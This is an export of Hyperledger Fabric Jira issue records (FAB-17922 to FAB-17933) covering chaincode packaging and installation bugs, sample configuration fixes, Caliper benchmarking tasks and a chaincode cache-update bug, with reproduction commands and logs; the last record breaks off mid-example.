Fix pvtdata integration test to properly check membership info,FAB-17922,45122,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,caod,caod,21/May/20 11:11 PM,21/May/20 11:30 PM,28/Oct/23 3:10 AM,21/May/20 11:30 PM,,,,,,,,,,,,,,fabric-ledger,fabric-peer,,,,,,,,0,privatedata,,,,,"Surfaced from [https://github.com/hyperledger/fabric/pull/1304] it seems the integration test added in [https://github.com/hyperledger/fabric/pull/626/|https://github.com/hyperledger/fabric/pull/626/commits/504c27431c20c4a10165c2d274d5fee388b3706a] always passed regardless of the production code fix, this issue strives to fix that existing integration test as well as introduce additional failure testing around when the MSP id isn't set.

 

Related to FAB-17059",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cbv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/May/20 11:30 PM;caod;See [https://github.com/hyperledger/fabric/pull/1304#issuecomment-632117197];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode package command does not detect module mode with import path,FAB-17924,45129,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,tsharris,shimos,shimos,23/May/20 12:47 AM,07/Jul/20 12:41 AM,28/Oct/23 3:10 AM,07/Jul/20 12:41 AM,v2.1.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The `chaincode package` function in the peer command is not detecting legacy and go module mode properly in the following cases:

- (Case 1) When `peer chaincode package` is called with the import path and the chaincode is using go module, unless you are in `$GOPATH/src`, packaging is performed with the legacy mode.
  This may lead to an issue when the dependent packages are only found in `$GOPATH/pkg`.

- (Case 2) On the other hand, when `go.mod` exists in an ancestor directory (which may be beyond GOPATH), packaging is performed with go module mode.


*(Example for Case 1)*

Suppose GOPATH is `/opt/gopath`, and the chaincode is in `/opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/fabcar/go`,

When path is relative (`.`), it works with module mode.

{noformat}
$ cd /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/fabcar/go
$ peer lifecycle chaincode package -l golang --label fabcar_1.0 -p . /tmp/fabcar.tar.gz
2020-05-21 16:47:03.933 PDT [bccsp] GetDefault -> DEBU 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:47:03.943 PDT [bccsp] GetDefault -> DEBU 002 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:47:03.944 PDT [main] InitCmd -> DEBU 003 peer lifecycle chaincode package does not need to init crypto
2020-05-21 16:47:04.602 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 004 Writing file to tarball: src/fabcar.go
2020-05-21 16:47:04.602 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 005 Writing file to tarball: src/go.mod
2020-05-21 16:47:04.602 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 006 Writing file to tarball: src/go.sum
{noformat}

But when path is import path, it goes to legacy mode.

{noformat}
$ peer lifecycle chaincode package -l golang --label fabcar_1.0 -p github.com/hyperledger/fabric-samples/chaincode/fabcar/go /tmp/fabcar.tar.gz
(snip)
2020-05-21 16:47:52.691 PDT [bccsp] GetDefault -> DEBU 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:47:52.701 PDT [bccsp] GetDefault -> DEBU 002 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:47:52.702 PDT [main] InitCmd -> DEBU 003 peer lifecycle chaincode package does not need to init crypto
2020-05-21 16:47:53.425 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 004 Writing file to tarball: src/github.com/PuerkitoBio/purell/purell.go
2020-05-21 16:47:53.426 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 005 Writing file to tarball: src/github.com/PuerkitoBio/urlesc/urlesc.go
(snip)
2020-05-21 16:47:54.297 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 259 Writing file to tarball: src/gopkg.in/yaml.v2/yaml.go
2020-05-21 16:47:54.298 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 25a Writing file to tarball: src/gopkg.in/yaml.v2/yamlh.go
2020-05-21 16:47:54.299 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 25b Writing file to tarball: src/gopkg.in/yaml.v2/yamlprivateh.go
{noformat}

*(Example for Case 2)*

For example, chaincode is BadImport of the test data in the fabric repository, and the repository is located at `/opt/gopath/src/github.com/hyperledger/fabric`.
It goes with the module mode and does not produce error for non-existent modules.

Without `go.mod` in the root directory of the fabric repository, it returns an error as expected.

{noformat}
$ cd /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata/src/chaincodes/BadImport
$ ls .
main.go
$ GOPATH=/opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata peer lifecycle chaincode package -l golang --label bad_1.0 -p . /tmp/bad.tar.gz
2020-05-21 16:54:13.467 PDT [bccsp] GetDefault -> DEBU 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:54:13.477 PDT [bccsp] GetDefault -> DEBU 002 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:54:13.478 PDT [main] InitCmd -> DEBU 003 peer lifecycle chaincode package does not need to init crypto
2020-05-21 16:54:13.639 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 004 Writing file to tarball: src/.dockerignore
2020-05-21 16:54:13.640 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 005 Writing file to tarball: src/.gitattributes
2020-05-21 16:54:13.640 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 006 Writing file to tarball: src/.gitignore
(snip)
2020-05-21 16:54:28.533 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 144a Writing file to tarball: src/vendor/gopkg.in/yaml.v2/yaml.go
2020-05-21 16:54:28.533 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 144b Writing file to tarball: src/vendor/gopkg.in/yaml.v2/yamlh.go
2020-05-21 16:54:28.534 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 144c Writing file to tarball: src/vendor/gopkg.in/yaml.v2/yamlprivateh.go
2020-05-21 16:54:28.534 PDT [chaincode.platform.util] WriteFileToPackage -> DEBU 144d Writing file to tarball: src/vendor/modules.txt

$ rm /opt/gopath/src/github.com/hyperledger/fabric/go.mod
$ GOPATH=/opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata peer lifecycle chaincode package -l golang --label bad_1.0 -p . /tmp/bad.tar.gz
2020-05-21 16:55:03.010 PDT [bccsp] GetDefault -> DEBU 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:55:03.020 PDT [bccsp] GetDefault -> DEBU 002 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-05-21 16:55:03.021 PDT [main] InitCmd -> DEBU 003 peer lifecycle chaincode package does not need to init crypto
Error: error getting chaincode bytes: failed to calculate dependencies: incomplete package: bogus/package
{noformat}
",,denyeart,shimos,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15732,FAB-17725,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,50f8ee23a2c03252535f71d391af5441cd645542,Unset,No,,,"1|i00n2e:8znqzzzzzohw",,,,Unset,Unset,,See the description,,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,shimos,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jun/20 7:12 PM;denyeart;[~sykesm] Matt could you offer your opinion on this one?;;;","02/Jul/20 11:38 PM;tsharris;[~shimos] As explained in this comment, Case 1 works as expected because an import path is not the same as a path. ;;;","03/Jul/20 3:17 AM;shimos;[~tsharris] Thank you for the comment. So is it right that the module mode works only with a real path (unless an import path happens to be the same as the real path)?;;;","03/Jul/20 5:05 AM;tsharris;IIUC yes. ;;;","07/Jul/20 12:41 AM;tsharris;In Case 2, when running in module mode no compile checks are performed on the chaincode (or it's dependencies) that are being packaged. An error would most likely be seen at installation/invocation of the chaincode. 

For both scenarios, there is no expectation that the chaincode packaging behavior will function the same across a variety of go versions, go.mod specifications, GOPATH mode, and Module mode. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Mismatched MSP ID and MSP Name in sample,FAB-17925,45130,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,varadatibm,varadatibm,23/May/20 3:08 AM,26/Dec/20 7:19 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,operator,,,,,"Under the Orderer MSP, the Name and the ID are mismatched...  If people use IBP, we make it the same across the board... if someone moved from base Fabric to IBP this causes some usability issues...

For consistency it would be good to keep them the same...

[https://github.com/hyperledger/fabric-samples/blob/v1.4.7/first-network/configtx.yaml#L19]",,denyeart,pandrejko,robmurgai,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cdn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,pandrejko,robmurgai,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/May/20 3:47 AM;pandrejko;[~negupta]Could you verify that this issue does not exist with the test network?;;;","02/Oct/20 10:00 AM;robmurgai;[~varadatibm] Is this still needed?

In 2.1.1, I checked the test-network and the MSP Name and ID now match: [https://github.com/hyperledger/fabric-samples/blob/v2.1.1/test-network/configtx/configtx.yaml]

In 1.4.8 - we were still on BYFN, so the mismatch is still there.  However I don't know if we will have someone start a new Fabric Project and bootstrap with BYFN 1.4.X, and anyone who is already on 1.4.X will not be updating their application because of this fix in Samples.

 ;;;","02/Oct/20 10:22 PM;varadatibm;[~robmurgai] as long as it is fixed going forward it is fine... thanks!;;;","12/Nov/20 4:06 AM;denyeart;Actually, in the test network sample, the OrdererOrg ID and Name are still different:

        Name: OrdererOrg
        ID: OrdererMSP

 I agree it will be cleaner to use this work item to make them the same.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode installation fails on 1.4.7,FAB-17926,45131,,Bug,Unverified,FAB,Fabric,software,denyeart,,,High,,,tongliofcary,tongliofcary,23/May/20 12:08 PM,03/Jun/20 12:30 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,"When installing chaincode onto a peer node, the install command will fail with the following error message.

root@cli:/vars/chaincode/simple/go# peer chaincode install --tls -l golang -v 1.0 -n simple \
> -p github.com/chaincode/simple/go
2020-05-23 02:35:46.445 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 001 Using default escc
2020-05-23 02:35:46.445 UTC [chaincodeCmd] checkChaincodeCmdParams -> INFO 002 Using default vscc
Error: error getting chaincode code simple: error getting chaincode package bytes: Error obtaining imports: command <go list -f \{{ join .Imports ""\n""}} github.com/chaincode/simple/go>: failed with error: ""exit status 1""
can't load package: package github.com/chaincode/simple/go: git init --bare in /opt/gopath/pkg/mod/cache/vcs/3098e492e12f86eeef521c6d580b49b51139da6f1822e0b304c0f501c5bbf1f5: exec: ""git"": executable file not found in $PATH

 

But git command is avalialbe in the $PATH.

 

Affected version is 1.4.7, but that is not available to select from the drop down below.",,btl5037,chanioxaris,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cdv:",,,,Unset,Unset,,"Setup fabric network using 1.4.7. try to install simple chaincode found here.
https://github.com/hyperledger/fabric/tree/master/integration/chaincode/simple.

It will fail with the error message. Same step worked fine on 1.4.6 or earlier.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,chanioxaris,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 12:30 PM;btl5037;I can't reproduce this issue locally;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add AllChaincodesInfo to DeployedChaincodeInfoProvider,FAB-17927,45132,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,25/May/20 6:18 AM,29/May/20 9:41 PM,28/Oct/23 3:10 AM,29/May/20 9:41 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ce3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/May/20 9:43 PM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1331];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Set header ""Cache-Control: no-store"" on List responses",FAB-17928,45133,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,25/May/20 3:40 PM,23/Jun/20 6:42 AM,28/Oct/23 3:10 AM,23/Jun/20 3:54 AM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ceb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Official Hyperledger Fabric Build Configuration support to target Linux ARM,FAB-17929,45135,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,blewater,blewater,25/May/20 9:50 PM,13/Jun/20 12:12 PM,28/Oct/23 3:10 AM,,v1.4.6,v2.0.1,v2.1.0,,,,,,,v2.0.0,v2.1.0,,,fabric-build,fabric-ca,fabric-cli,fabric-ledger,fabric-orderer,fabric-peer,fabric-release,fabric-tools,,1,build-system,,,,,"Hi,

This is a request to add official Fabric build support for Linux/ARM architectures. The changes are minimal and mostly makefile related drawing from my experience in building the most recent Fabric builds v1.4.5-v.1.4.6 (RaspberryPi-4 support included).

However, Fabric has since moved on to release 2.0+.  Rather than cloning Fabric and building those shall we introduce official support for them? I could post a pull-request, and/or contribute to this effort.

Please let us know how we can help to offer official support for them.

BTW the images I built are available at [https://hub.docker.com/r/blewater]

 ",,blewater,btl5037,christophe.charles,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-10382,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cer:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),blewater,btl5037,christophe.charles,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 12:43 PM;btl5037;You can check out a pull request we had recently around this same request which has a lot of information and feedback from the Fabric maintainers: [https://github.com/hyperledger/fabric/pull/1086]

The gist of it is, there haven't been a lot of requests for this, and there is more than just providing the images. In particular, project contributors and maintainers have to commit to fixing any code that may not work on arm. Just publishing the images isn't enough, without a strong commitment from contributors who have a history of contributing to fabric, moving forward with this request is difficult.

That being said, major requests like this go through an RFC process that is documented here: [https://github.com/hyperledger/fabric-rfcs]

If you feel strongly about this, and can address the comments in the Pull Request I linked and can provide some guarantees on your response to those concerns, please draft an RFC in the fabric-rfcs repo and reach out via chat.hyperledger.org to consult with Dave Enyeart and I (Fabric Release Managers) to discuss this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Two samples need updated license,FAB-17930,45137,,Task,Closed,FAB,Fabric,software,denyeart,,,Low,Done,swinslow,swinslow,ryjones,27/May/20 3:14 AM,27/May/20 5:26 AM,28/Oct/23 3:10 AM,27/May/20 5:26 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Some files appear to be original to Hyperledger, but contain license headers indicating that they were contributed to the Apache Software Foundation under a CLA. If these files are in fact original to Hyperledger, then this header should be replaced with either the standard Apache-2.0 license notice, and/or with a short-form ID:
SPDX-License-Identifier: Apache-2.0

fabric-samples/chaincode/fabcar/external/fabcar.go
fabric-samples/chaincode/fabcar/go/fabcar.go",,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cf7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ryjones,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/May/20 5:26 AM;ryjones;https://github.com/hyperledger/fabric-samples/pull/191;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Convert Barbones Test to Caliper,FAB-17931,45139,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,27/May/20 11:03 PM,25/Jun/20 12:12 AM,28/Oct/23 3:10 AM,25/Jun/20 12:12 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Caliper is the official Hyperledger performance benchmarking tool. The Fabric maintainers have decided that performance metrics are going to be benchmarked against Caliper. While other tests can and will be performed using PTE the barebones performance test should be converted to use Caliper to drive its testing.

Acceptance Criteria: Barebones runs in CI to completion driven by Caliper",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zw9i",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jun/20 2:09 AM;btl5037;Need support for parallel chaincode upgrade, maybe add parallelUpgrade flag to spec file;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Make Target To Install Caliper,FAB-17932,45140,45139,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,28/May/20 1:32 AM,04/Jun/20 1:29 AM,28/Oct/23 3:10 AM,04/Jun/20 1:29 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"To support using Caliper in system tests we need to add a Make target to install caliper. This should do a global installation of caliper so that it can be called from anywhere. The instructions for install globally are here: [https://hyperledger.github.io/caliper/vNext/installing-caliper/#local-npm-install] in the `Global NPM Install` section.

Acceptance Criteria: After calling the make target, I should be able to call `caliper` from the CLI with no additional setup necessary",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cfn:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix cache update logic for installed chaincode info when specifying an empty or uninstalled package ID,FAB-17933,45141,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,28/May/20 1:43 AM,04/Jul/20 12:11 AM,28/Oct/23 3:10 AM,04/Jul/20 12:11 AM,v2.0.1,v2.1.0,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Current cache update logic for install chaincode info implemented in *`core/chaincode/lifecycle/cache.go`* does not work properly when an empty or uninstalled package ID is specified.
 The following are the examples with *`fabric-samples/test-network`*:

*Example 1:*
{code:bash}
## Deploy chaincode `fabcar` 
$ cd fabric-samples/test-network
$ ./network.sh up createChannel
$ ./network.sh deployCC
$ export FABRIC_CFG_PATH=$PWD/../config/
$ export CORE_PEER_TLS_ENABLED=true
$ export CORE_PEER_LOCALMSPID=""Org1MSP""
$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
$ export CORE_PEER_ADDRESS=localhost:7051

$ peer lifecycle chaincode queryinstalled -O json
{
        ""installed_chaincodes"": [
                {
                        ""package_id"": ""fabcar_1:88123f604c19b10b64aae3d9c7babf8099cf8aeb1cc6cc5771f47a27205584d1"",
                        ""label"": ""fabcar_1"",
                        ""references"": {
                                ""mychannel"": {
                                        ""chaincodes"": [
                                                {
                                                        ""name"": ""fabcar"",
                                                        ""version"": ""1""
                                               }
                                        ]
                                }
                        }
                }
        ]
}

## Update to detach the chaincode package from the chaincode definition (This has a problem)
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --init-required --sequence 12020-05-26 19:51:23.570 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [271029cea8efdad02a91524d59eae8d1473478f8c0b6fe0e7c35a266ff3ff9b2] committed with status (VALID) at 

$ peer lifecycle chaincode queryapproved -C mychannel -n fabcar --sequence 1
Approved chaincode definition for chaincode 'fabcar' on channel 'mychannel':
sequence: 1, version: 1, init-required: true, package-id: , endorsement plugin: escc, validation plugin: vscc

$ peer lifecycle chaincode queryinstalled -O json ## Problem: the references are NOT updated
{
        ""installed_chaincodes"": [
                {
                        ""package_id"": ""fabcar_1:88123f604c19b10b64aae3d9c7babf8099cf8aeb1cc6cc5771f47a27205584d1"",
                        ""label"": ""fabcar_1"",
                        ""references"": {
                                ""mychannel"": {
                                        ""chaincodes"": [
                                                {
                                                        ""name"": ""fabcar"",
                                                        ""version"": ""1""
                                                }
                                        ]
                                }
                        }
                }
        ]
}

## After restart the peer, the references are updated properly
$ docker restart peer0.org1.example.com
$ peer lifecycle chaincode queryinstalled -O json
{
        ""installed_chaincodes"": [
                {
                        ""package_id"": ""fabcar_1:88123f604c19b10b64aae3d9c7babf8099cf8aeb1cc6cc5771f47a27205584d1"",
                        ""label"": ""fabcar_1""
                }
        ]
}
{code}
*Example 2:*
{code:bash}
## Deploy chaincode `fabcar` using `fabric-samples/test-network`
$ (As same as Example 1)

## Commit to update the chaincode definition with an empty package ID (This has a problem)

$ export FABRIC_CFG_PATH=$PWD/../config/
$ export CORE_PEER_TLS_ENABLED=true
$ export CORE_PEER_LOCALMSPID=""Org1MSP""
$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
$ export CORE_PEER_ADDRESS=localhost:7051
